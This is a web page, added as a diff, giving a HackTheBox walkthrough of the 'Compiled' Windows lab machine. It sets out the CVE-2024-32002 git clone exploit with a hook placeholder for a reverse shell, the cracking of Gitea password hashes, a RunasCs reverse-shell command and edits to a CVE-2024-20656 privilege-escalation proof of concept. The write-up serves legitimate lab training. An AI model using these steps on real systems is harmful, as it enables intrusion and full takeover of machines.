@@ -1,0 +1,272 @@
+---
+import Docs from '../../../../layouts/Docs.astro';
+import { techSidebar } from '../../../../data/sidebars';
+
+const breadcrumbs = [
+  { label: 'Home', href: '/' },
+  { label: 'Tech', href: '/tech/' },
+  { label: 'Cybersecurity', href: '/tech/cybersecurity/' },
+  { label: 'HackTheBox', href: '/tech/cybersecurity/hackthebox/' },
+  { label: 'Compiled', href: '/tech/cybersecurity/hackthebox/compiled/' },
+];
+---
+
+<Docs title="Compiled" sidebarItems={techSidebar} breadcrumbs={breadcrumbs}>
+  <div class="fade-in">
+    <h2>Hints</h2>
+    <ul>
+      <li><strong>Shell Hint:</strong> 2024 CVE related to the process required for the functionality of port 5000.</li>
+      <li><strong>User Hint:</strong> File with a crackable hash.</li>
+      <li><strong>Root Hint:</strong> 2024 privilege escalation CVE related to VSCode.</li>
+    </ul>
+
+    <hr>
+
+    <p>This will be a walkthrough of <code>Compiled</code>, a medium difficulty Windows machine from <code>HackTheBox</code>.</p>
+
+    <h2>Enumeration</h2>
+
+    <h3>Nmap</h3>
+    <p>We begin with an Nmap scan to gather our bearings.</p>
+
+    <pre><code class="language-bash">nmap -sVC -T4 compiled.htb -Pn</code></pre>
+
+    <pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 22:01 +03
+Nmap scan report for compiled.htb (10.10.11.26)
+Host is up (0.11s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+3000/tcp open  http?
+5000/tcp open  http?
+...</code></pre>
+
+    <h3>Web</h3>
+    <p>We can visit the sites to confirm that they are indeed HTTP services. Another option is to use EyeWitness, a handy tool for evaluating webpages, especially when dealing with multiple hosts.</p>
+
+    <pre><code class="language-bash">echo "http://compiled.htb:3000 \nhttp://compiled.htb:5000" &gt; compiled_sites.txt</code></pre>
+
+    <pre><code class="language-bash">eyewitness -f compiled_sites.txt</code></pre>
+
+    <p>Upon visiting the sites, we observe:</p>
+
+    <table>
+      <tr>
+        <td style="text-align: center;"><img src="/images/hackthebox/compiled/gitea_home.png" alt="Gitea Site"><br><em>Gitea Site</em></td>
+        <td style="text-align: center;"><img src="/images/hackthebox/compiled/compiled_home.png" alt="Custom Web App called Compiled"><br><em>Custom Web App called 'Compiled'</em></td>
+      </tr>
+    </table>
+
+    <p>Notably, the custom web app requests a URL to a GitHub repository to compile.</p>
+
+    <hr>
+    <hr>
+    <img src="/images/hackthebox/compiled/compiled_urlsubmit.png" alt="URL Submission" style="width: 800px;">
+
+    <p>I tend to run some directory brute-force scans in the background when I discover websites. The one running for the Gitea site found some interesting directories.</p>
+
+    <pre><code class="language-bash">feroxbuster --url http://compiled.htb:5000 -r -t 100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404,403,400,503,500,501,502 -x txt,sh,zip,bak,py,php --dont-scan "vendor,fonts,images,css,assets,docs,js,static,img,help"</code></pre>
+
+    <pre><code class="language-bash">200      GET      12l       73w      704c http://compiled.htb:3000/api/swagger
+200      GET      312l     934w    11383c http://compiled.htb:3000/user/sign_up
+200      GET      311l     926w    11113c http://compiled.htb:3000/user/login
+200      GET      378l    1782w    18671c http://compiled.htb:3000/explore/repos</code></pre>
+
+    <p>Visiting <code>http://compiled.htb:3000/explore/repos</code>, we find the source code for a site that compiles code by cloning a repository and compiling locally. This site shares a name with the site hosted at <code>http://compiled.htb:5000</code>.</p>
+
+    <img src="/images/hackthebox/compiled/explore_repos.png" alt="Explore Repos">
+
+    <p>At <code>http://compiled.htb:3000/richard/Compiled/src/branch/main/app.py</code>, we find a Flask app whose behavior matches that of the Compiled site.</p>
+
+    <pre><code class="language-python">from flask import Flask, request, render_template, redirect, url_for
+import os
+
+app = Flask(__name__)
+
+# Configuration
+REPO_FILE_PATH = r'C:\Users\Richard\source\repos\repos.txt'
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    error = None
+    success = None
+    if request.method == 'POST':
+        repo_url = request.form['repo_url']
+        if # Add a sanitization to check for valid Git repository URLs.
+            with open(REPO_FILE_PATH, 'a') as f:
+                f.write(repo_url + '\n')
+            success = 'Your git repository is being cloned for compilation.'
+        else:
+            error = 'Invalid Git repository URL. It must start with "http://" and end with ".git".'
+    return render_template('index.html', error=error, success=success)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)</code></pre>
+
+    <p>Initially, thoughts of path traversal, LFI, or filter bypassing crossed my mind, as did getting a shell to compile and then be run since the website states that we can "view our results," implying that there may be some form of execution. None of these paths seemed promising after some probing. Searching for "git compile RCE," we find a promising, recent post titled "<a href="https://amalmurali.me/posts/git-rce/" target="_blank" rel="noopener noreferrer">Exploiting CVE-2024-32002: RCE via git clone</a>".</p>
+
+    <h2>Foothold</h2>
+
+    <h3>Gitea Setup</h3>
+    <p>Following the exploitation process described in the blog post, we see that we need two accessible repositories and a victim to recursively clone one of those repositories.</p>
+
+    <p>Luckily, we have a Gitea instance accessible. We create an account on the instance:</p>
+
+    <img src="/images/hackthebox/compiled/register.png" alt="Registration">
+
+    <p>and then make two repositories:</p>
+
+    <img src="/images/hackthebox/compiled/newrepo.png" alt="Make Repos">
+    <img src="/images/hackthebox/compiled/reposmade.png" alt="Repo Made">
+
+    <h3>Repository Setup</h3>
+
+    <p><strong>Initial:</strong></p>
+    <pre><code class="language-bash">git config --global protocol.file.allow always
+git config --global core.symlinks true
+git config --global init.defaultBranch main</code></pre>
+
+    <p><strong>Setting Up the Staging Repository:</strong></p>
+
+    <ol>
+      <li>Clone and enter the repository.</li>
+      <li>Create the directory <code>y</code> and subdirectory <code>y/hooks/</code>.</li>
+      <li>Within <code>y/hooks/</code>, create the file <code>post-checkout</code> with the following content:</li>
+    </ol>
+
+    <pre><code class="language-sh">#!bin/sh.exe
+*payload here*</code></pre>
+
+    <p>I chose to use the bash Base64 encoded payload from <code>revshells.com</code>.</p>
+
+    <ol start="4">
+      <li>Make the newly created file executable:</li>
+    </ol>
+
+    <pre><code class="language-bash">chmod +x y/hooks/post-checkout</code></pre>
+
+    <p><strong>Setting Up the Executing Repository:</strong></p>
+
+    <ol>
+      <li>Clone the second repository and enter it.</li>
+      <li>Add the other repository as a submodule:</li>
+    </ol>
+
+    <pre><code class="language-bash">git submodule add --name x/y "http://compiled.htb:3000/djasper/staging.git" A/modules/x</code></pre>
+
+    <ol start="3">
+      <li>Commit this change and then run:</li>
+    </ol>
+
+    <pre><code class="language-bash">printf ".git" &gt; dotgit.txt
+git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash
+printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" &gt; index.info
+git update-index --index-info &lt; index.info</code></pre>
+
+    <p>This is the crux of the exploit, let's break it down a bit:</p>
+
+    <ul>
+      <li>
+        <p>(a) Create a file named <code>dotgit.txt</code> containing the string <code>.git</code>:</p>
+        <pre><code class="language-bash">printf ".git" &gt; dotgit.txt</code></pre>
+        <p>This command writes the string <code>.git</code> to a file named <code>dotgit.txt</code>. This file will be used in the next step to generate a Git object.</p>
+      </li>
+      <li>
+        <p>(b) Generate a Git hash object from the contents of <code>dotgit.txt</code>:</p>
+        <pre><code class="language-bash">git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash</code></pre>
+        <p>Here, the <code>git hash-object</code> command reads the contents of <code>dotgit.txt</code> and creates a Git blob object. The <code>-w</code> flag writes this object to the Git object database, and the resulting hash is saved in the file <code>dot-git.hash</code>.</p>
+      </li>
+      <li>
+        <p>(c) Prepare an index entry for the Git submodule with the symlink pointing to the <code>.git</code> directory:</p>
+        <pre><code class="language-bash">printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" &gt; index.info</code></pre>
+        <p>This command formats a string with the appropriate Git index entry for a symlink. The mode <code>120000</code> indicates a symlink, and the hash of the object created in the previous step is inserted into the string. The result is saved to <code>index.info</code>.</p>
+      </li>
+      <li>
+        <p>(d) Update the Git index with the new entry from <code>index.info</code>:</p>
+        <pre><code class="language-bash">git update-index --index-info &lt; index.info</code></pre>
+      </li>
+    </ul>
+
+    <p>Finally, the <code>git update-index</code> command reads the formatted string from <code>index.info</code> and updates the Git index with this new entry. This effectively adds a symlink in the repository that points to the <code>.git</code> directory of the submodule.</p>
+
+    <p>By creating a symlink to the <code>.git</code> directory, this setup can trick the victim into executing malicious hooks or commands when they interact with the repository. This specific manipulation allows the attacker to execute code on the victim's machine when the repository is cloned and checked out, leveraging Git's behavior with submodules and symlinks.</p>
+
+    <ol start="4">
+      <li>Commit this and push the changes.</li>
+    </ol>
+
+    <p><strong>Triggering the Exploit</strong></p>
+
+    <p>We visit <code>http://compiled.htb:5000</code>, where the compilation app is hosted, and submit the <code>.git</code> URL of the second repository to execute the cloning and receive our reverse shell. This may need to be done multiple times due to inconsistencies with the server.</p>
+
+    <h2>User Shell</h2>
+
+    <p>After enumerating the host, we find <code>C:/Program Files/Gitea/data</code> with the file <code>Gitea.db</code>.</p>
+
+    <pre><code>PS C:\Program Files\Gitea\data&gt; ls
+
+Directory: C:\Program Files\Gitea\data
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         5/22/2024   8:08 PM                actions_artifacts
+d-----         5/22/2024   8:08 PM                actions_log
+d-----         5/22/2024   8:08 PM                attachments
+d-----         5/22/2024   8:08 PM                avatars
+d-----         7/29/2024  10:26 PM                gitea-repositories
+d-----         5/22/2024   8:08 PM                home
+d-----         5/22/2024   8:08 PM                indexers
+d-----         5/22/2024   8:08 PM                jwt
+d-----         5/22/2024   8:08 PM                lfs
+d-----         5/22/2024   8:08 PM                packages
+d-----         5/22/2024   8:08 PM                queues
+d-----         5/22/2024   8:08 PM                repo-archive
+d-----         5/22/2024   8:08 PM                repo-avatars
+d-----         7/29/2024   9:26 PM                sessions
+d-----         5/24/2024   5:32 PM                tmp
+-a----         7/29/2024  10:27 PM        2023424 gitea.db</code></pre>
+
+    <p>Downloading this file, we get:</p>
+
+    <pre><code class="language-sql">sqlite&gt; select * from user;
+1|administrator|administrator||administrator@compiled.htb|0|enabled|...
+2|richard|richard||richard@compiled.htb|0|enabled|...
+4|emily|emily||emily@compiled.htb|0|enabled|...</code></pre>
+
+    <p>To crack these hashes, we convert the hash and the salt to base64, giving us the hashes that look like:</p>
+
+    <pre><code>sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=</code></pre>
+
+    <p>We run:</p>
+
+    <pre><code class="language-bash">hashcat -a 0 -m 10900 hashes.txt rockyou.txt --show</code></pre>
+
+    <p>Which yields <code>12345678</code> as Emily's password:</p>
+
+    <pre><code>sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:...=:12345678</code></pre>
+
+    <p>We use <code>RunasCs.exe</code> to catch a shell as Emily from our non-interactive compiler shell.</p>
+
+    <pre><code class="language-bash">.\RunasCs.exe Emily 12345679 powershell -r ip:port</code></pre>
+
+    <h2>Privilege Escalation</h2>
+
+    <p>After some enumeration, we find the <code>VSStandardCollectorService150</code> service. Searching the internet yields another recent <a href="https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/" target="_blank" rel="noopener noreferrer">CVE for LPE</a>. The <a href="https://github.com/Wh04m1001/CVE-2024-20656" target="_blank" rel="noopener noreferrer">PoC widely available</a> needs a few small edits, namely to change the MS VSCode version in line 4 to match the appropriate date:</p>
+
+    <pre><code class="language-c">WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";</code></pre>
+
+    <p>and to change the executed command (line 187) to be a reverse shell, as we don't have RDP access to the computer, and thus lack the ability to abuse an elevated shell:</p>
+
+    <pre><code class="language-c">CopyFile(L"c:\\windows\\system32\\cmd.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);</code></pre>
+
+    <p>to:</p>
+
+    <pre><code class="language-c">CopyFile(L"c:\\temp\\reverse.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);</code></pre>
+
+    <p>Compile the exploit with VS Code C++ Release on release mode. Then transfer and execute the binary.</p>
+
+    <p>Catch your shell and gain root access!</p>
+
+    <h3>PostScript</h3>
+    <p>Thank you for reading. If you enjoyed the walkthrough and learned something along the way, please drop a respect on my <a href="https://app.hackthebox.com/profile/1001444" target="_blank" rel="noopener noreferrer">HackTheBox Profile</a> or check out more of my content which will be forthcoming.</p>
+  </div>
+</Docs>
